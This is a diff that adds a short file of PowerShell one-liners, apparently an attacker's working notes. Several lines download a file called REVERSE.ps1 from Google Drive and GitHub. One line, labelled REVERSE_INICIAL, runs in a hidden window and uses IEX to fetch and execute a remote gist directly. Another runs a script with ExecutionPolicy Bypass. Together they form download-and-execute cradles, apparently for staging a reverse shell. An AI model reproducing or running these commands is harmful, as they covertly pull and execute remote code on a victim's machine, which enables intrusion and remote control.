@@ -1,0 +1,22 @@
+IEX (New-Object System.Net.WebClient).DownloadFile('https://drive.google.com/u/1/uc?id=15kLalcw1MyEJ-62VdQ7GLL5Ex55mVxWo&export=download&confirm=t&uuid=cfc3128e-23cb-4752-a3c2-7fe1fb9a325c' , "REVERSE.ps1")
+
+$client = new-object System.Net.WebClient
+$client.DownloadFile("https://drive.google.com/u/1/uc?id=15kLalcw1MyEJ-62VdQ7GLL5Ex55mVxWo&export=download&confirm=t&uuid=cfc3128e-23cb-4752-a3c2-7fe1fb9a325c" , "REVERSE.ps1")
+
+
+powershell -windowstyle hidden -ExecutionPolicy Bypass -File "C:\MyUnsignedScript.ps1"
+
+REVERSE_INICIAL :
+powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/Gaaskenz/4eee445e8b709170ba4cf5243e6e246b/raw/fca06a1bcc3f9864b72c8276b4c0c921e5060798/INICIAL_REVERSE')"
+
+
+
+
+
+
+
+
+
+
+$client = new-object System.Net.WebClient
+$client.DownloadFile("https://github.com/Gaaskenz/TESTE/archive/refs/heads/main.zip" , "REVERSE.ps1")
